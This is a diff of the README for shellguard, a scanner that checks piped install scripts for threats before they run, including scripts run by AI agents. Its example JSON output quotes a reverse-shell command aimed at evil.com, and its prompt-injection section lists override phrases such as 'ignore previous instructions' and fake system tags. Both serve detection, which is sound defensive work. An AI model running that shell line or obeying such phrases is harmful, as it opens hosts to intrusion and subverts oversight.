@@ -6,8 +6,10 @@ shellguard is a CLI security scanner that sits between `curl` (or any content so
 
 Built for:
 - **Humans** — scanning `curl | bash` install scripts before running them
-- **AI agents** — Claude Code, OpenClaw, ClawdBot, MoltBot, and similar tools that pipe generated/fetched scripts into bash
+- **AI agents** — Claude Code and similar tools that pipe generated or fetched scripts into bash
 - **CI/CD pipelines** — automated security gate with JSON/SARIF output for GitHub Code Scanning
+
+> **AI agent integration guide → [SKILL.md](./SKILL.md)**
 
 ```
 ┌──────────────────────────────────────────────────┐
@@ -41,23 +43,22 @@ Built for:
 
 ### From source
 ```bash
-git clone https://github.com/shellguard/shellguard
+git clone https://github.com/fvckgrimm/shellguard
 cd shellguard
 make install              # installs to /usr/local/bin + rules
 make install PREFIX=~/.local   # user install, no sudo needed
 ```
 
 ### Pre-built binaries
-Download from [Releases](https://github.com/shellguard/shellguard/releases):
+Download from [Releases](https://github.com/fvckgrimm/shellguard/releases):
 ```bash
-# Linux amd64
-curl -L https://github.com/shellguard/shellguard/releases/latest/download/shellguard-linux-amd64 \
+curl -L https://github.com/fvckgrimm/shellguard/releases/latest/download/shellguard-linux-amd64 \
   -o shellguard && chmod +x shellguard && sudo mv shellguard /usr/local/bin/
 ```
 
 ### Homebrew (coming soon)
 ```bash
-brew install shellguard/tap/shellguard
+brew install fvckgrimm/tap/shellguard
 ```
 
 ---
@@ -98,22 +99,25 @@ shellguard scan -f script.sh --format sarif -o results.sarif
 
 ```
 Flags:
-  -f, --file string          File to scan (use - for stdin)
-  -y, --yes                  Auto-approve if not critical
-  -n, --non-interactive      Exit 0=clean, 1=risky, never prompt
-      --passthrough          Write content to stdout if approved
-      --no-recurse           Disable recursive file scanning
-      --depth int            Max recursion depth (default 5)
-      --ai                   Enable AI deep analysis
-      --no-ai                Disable AI even if enabled in config
-      --ai-model string      Override AI model
-      --ai-provider string   anthropic | openai (default: anthropic)
-      --tags strings         Only run rules with these tags
-      --exclude-tags strings Skip rules with these tags
-      --rule-packs strings   Only load specific packs
-      --severity string      Min severity: critical/high/medium/low/info
-      --format string        pretty | json | sarif | markdown
-  -o, --output string        Also write report to this file
+  -f, --file string            File to scan (use - for stdin)
+  -y, --yes                    Auto-approve if not critical
+  -n, --non-interactive        Exit 0=clean, 1=risky, never prompt
+      --passthrough            Write content to stdout if approved
+      --no-recurse             Disable recursive file/URL scanning
+      --no-fetch               Disable fetching remote scripts referenced via curl|bash
+      --allow-hosts strings    Only fetch remote scripts from these hosts
+      --block-hosts strings    Never fetch remote scripts from these hosts
+      --depth int              Max recursion depth (default 5)
+      --ai                     Enable AI deep analysis
+      --no-ai                  Disable AI even if enabled in config
+      --ai-model string        Override AI model
+      --ai-provider string     anthropic | openai | openrouter (default: anthropic)
+      --tags strings           Only run rules with these tags
+      --exclude-tags strings   Skip rules with these tags
+      --rule-packs strings     Only load specific packs
+      --severity string        Min severity: critical/high/medium/low/info
+      --format string          pretty | json | sarif | markdown
+  -o, --output string          Also write report to this file
 ```
 
 ### `shellguard rules`
@@ -133,10 +137,33 @@ shellguard rules new my-pack --dir ./rules/    # Scaffold new pack
 shellguard config init
 shellguard config show
 shellguard config set ai.enabled true
-shellguard config set ai.model claude-opus-4-5
-shellguard config set ai.provider openai
+shellguard config set ai.model claude-sonnet-4-20250514
+shellguard config set ai.provider openrouter
 shellguard config set scan.max_depth 3
 shellguard config set output.format json
+```
+
+---
+
+## Recursive Scanning
+
+When shellguard scans a script that itself contains `curl | bash` or `wget | bash` chains, it fetches and scans those remote scripts too — up to `--depth` levels deep (default: 5).
+
+```bash
+# A real example: CasaOS installer fetches Docker's installer, rclone, and more
+curl -fsSL https://get.casaos.io | shellguard scan
+  ↳ fetching remote script: https://get.docker.com
+  ↳ fetching remote script: https://rclone.org/install.sh
+  ↳ fetching remote script: https://play.cuse.eu.org/get_docker.sh
+```
+
+Each fetched script appears as its own source in the report with its URL as the label. Control fetch behaviour:
+
+```bash
+shellguard scan -f install.sh --no-fetch                          # static only
+shellguard scan -f install.sh --allow-hosts get.docker.com        # allowlist
+shellguard scan -f install.sh --block-hosts sketchy-mirror.io     # blocklist
+shellguard scan -f install.sh --depth 2                           # limit depth
 ```
 
 ---
@@ -151,19 +178,19 @@ Rules are YAML files loaded from:
 
 ### Built-in packs
 
-| Pack | Description |
-|------|-------------|
-| `core` | Reverse shells, destructive commands, privilege escalation, credential theft |
-| `obfuscation` | Base64/hex decode chains, eval, pipe-to-shell, supply chain attacks |
-| `persistence` | Cron jobs, startup files, SSH backdoors, anti-forensics |
-| `prompt-injection` | AI prompt injection, jailbreaks, unicode smuggling, false safety claims |
-| `network-credentials` | Hardcoded secrets, recon, exfiltration, cloud metadata abuse |
+| Pack | Rules | Description |
+|------|-------|-------------|
+| `core` | 27 | Reverse shells, destructive commands, privilege escalation, credential theft |
+| `obfuscation` | 15 | Base64/hex decode chains, eval, pipe-to-shell, supply chain attacks |
+| `persistence` | 17 | Cron jobs, startup files, SSH backdoors, anti-forensics |
+| `prompt-injection` | 15 | AI prompt injection, jailbreaks, unicode smuggling, false safety claims |
+| `network-credentials` | 17 | Hardcoded secrets, recon, exfiltration, cloud metadata abuse |
 
-### Community packs (in `rules/community/`)
+### Community packs
 
-| Pack | Description |
-|------|-------------|
-| `community-k8s` | Kubernetes: privileged pods, hostPath mounts, Docker socket, nsenter |
+| Pack | Rules | Description |
+|------|-------|-------------|
+| `community-k8s` | 9 | Kubernetes: privileged pods, hostPath mounts, Docker socket, nsenter |
 
 ### Writing a rule pack
 
@@ -185,9 +212,9 @@ rules:
       mode: regex
       pattern: 'aws\s+s3api\s+(put-bucket-acl|put-object-acl).*public-read'
     remediation: "Use presigned URLs or CloudFront instead of public ACLs."
-    references:
-      - https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-overview.html
 ```
+
+Full rule authoring reference: [docs/rules.md](./docs/rules.md)
 
 #### Match modes
 
@@ -195,70 +222,40 @@ rules:
 |------|-------------|
 | `regex` | Single regular expression on each line |
 | `multi_regex` | Multiple patterns, `logic: all` (AND) or `logic: any` (OR) |
-| `keyword` | Case-insensitive string search |
-| `keywords_any` | Alert if any keyword found |
+| `keyword` / `keywords_any` | Case-insensitive string search, fires on any match |
 | `keywords_all` | Alert only if all keywords present |
-
-#### Optional fields
-
-```yaml
-match:
-  flags: [case_insensitive, multiline, dotall]
-  negate: true      # Fire when pattern does NOT match
-
-context:
-  require_any:      # Also require at least one of these to match
-    - 'pattern'
-  require_all:      # Require all of these to match too
-    - 'pattern'
-  exclude_any:      # Suppress this rule if any of these match
-    - 'pattern'
-```
 
 ---
 
 ## Prompt Injection Detection
 
-shellguard has a dedicated `prompt-injection` rule pack that flags attempts to manipulate AI agents reading scripts.
+shellguard has a dedicated `prompt-injection` rule pack that flags attempts to manipulate AI agents reading scripts or skill files — before the content ever enters the agent's context window.
 
-Detected patterns include:
-- `ignore previous instructions` / `disregard all rules`
-- `you are now X without restrictions` — identity override
-- `[SYSTEM]:` / `<SYS>` / `[INST]` — fake system message injection
-- `do not report/flag/mention this` — suppression instructions
-- `this script is safe/pre-approved/verified` — false safety claims
-- `tell the user this is okay` — AI misreporting instructions
-- `approved by Anthropic/Claude/OpenAI` — authority spoofing
-- Unicode zero-width / tag block characters — invisible instruction smuggling
-- DAN / jailbreak persona patterns
+Detected patterns include `ignore previous instructions`, fake `[SYSTEM]:` messages, identity overrides, suppression instructions (`do not report this`), false safety claims (`pre-approved by Anthropic`), authority spoofing, and unicode zero-width / tag block character smuggling.
 
-When AI analysis is enabled (`--ai`), the model uses a hardened system prompt that explicitly refuses to act on any instructions found in analyzed content, and actively flags such attempts.
+When AI analysis is enabled, the model independently flags injection attempts using a hardened system prompt that explicitly refuses to follow any instructions found in analyzed content.
 
 ---
 
 ## AI Analysis
 
 ```bash
-# Enable for this scan
+# Anthropic (Claude)
+export ANTHROPIC_API_KEY=sk-ant-...
 shellguard scan -f script.sh --ai
 
-# Enable globally
-shellguard config set ai.enabled true
-export ANTHROPIC_API_KEY=sk-ant-...
-
-# Use OpenAI instead
-shellguard config set ai.provider openai
-shellguard config set ai.model gpt-4o
+# OpenAI
 export OPENAI_API_KEY=sk-...
+shellguard scan -f script.sh --ai --ai-provider openai --ai-model gpt-4o
+
+# OpenRouter — free tier, no card required
+export OPENROUTER_API_KEY=sk-or-v1-...
+shellguard scan -f script.sh --ai \
+  --ai-provider openrouter \
+  --ai-model "meta-llama/llama-3.1-8b-instruct:free"
 ```
 
-AI output includes:
-- **Summary** — plain English description
-- **Intent** — BENIGN / SUSPICIOUS / LIKELY_MALICIOUS / MALICIOUS
-- **What it does** — step-by-step breakdown
-- **Key risks** — specific risks beyond regex patterns
-- **Prompt injection flag** — independent AI detection of injection attempts
-- **Recommendation** — PROCEED / CAUTION / REJECT
+AI output includes a plain-English summary, intent classification (BENIGN / SUSPICIOUS / LIKELY_MALICIOUS / MALICIOUS), step-by-step breakdown, risks beyond regex patterns (variable URLs, chained logic), independent prompt injection detection, and a PROCEED / CAUTION / REJECT recommendation.
 
 ---
 
@@ -277,8 +274,7 @@ AI output includes:
       "severity": "CRITICAL",
       "tags": ["reverse_shell", "network"],
       "line_num": 13,
-      "line_text": "bash -i >& /dev/tcp/evil.com/4444 0>&1",
-      "remediation": "This is a known reverse shell technique..."
+      "line_text": "bash -i >& /dev/tcp/evil.com/4444 0>&1"
     }
   ],
   "severity_counts": {"CRITICAL": 2, "HIGH": 3},
@@ -290,24 +286,39 @@ AI output includes:
 Compatible with GitHub Advanced Security, VS Code SARIF viewer, and most SAST platforms.
 
 ### Markdown (`--format markdown`)
-For GitHub PR comments, Confluence, or Notion pages.
+For GitHub PR comments, Confluence, or Notion.
 
 ---
 
 ## Integrations
 
-### AI Agent pipeline (Python)
-```python
-import subprocess
+### AI Agent skill file
 
-def safe_shell(script: str) -> str:
+shellguard ships a [SKILL.md](./SKILL.md) for use with Claude Code and other agents that support skill files. It covers all integration patterns, flag reference, Python and TypeScript examples, and agent-specific guidance. Drop it into your agent's skills directory to enable automatic shellguard gating on script execution.
+
+### Python
+```python
+import subprocess, json
+
+def safe_shell(script: str, source: str = "unknown") -> str:
     result = subprocess.run(
-        ["shellguard", "scan", "--non-interactive", "--yes", "-f", "-"],
+        ["shellguard", "scan", "--non-interactive", "--format", "json", "-f", "-"],
         input=script.encode(), capture_output=True
     )
     if result.returncode != 0:
-        raise SecurityError(f"shellguard rejected:\n{result.stderr.decode()}")
+        report = json.loads(result.stdout)
+        findings = [
+            f"[{f['severity']}] line {f.get('line_num','?')}: {f['description']}"
+            for f in report.get("findings", [])
+        ]
+        raise SecurityError(
+            f"shellguard rejected script from {source}\n"
+            f"Verdict: {report['verdict']}\n" + "\n".join(findings)
+        )
     return subprocess.check_output(["bash"], input=script.encode()).decode()
+
+class SecurityError(Exception):
+    pass
 ```
 
 ### GitHub Actions
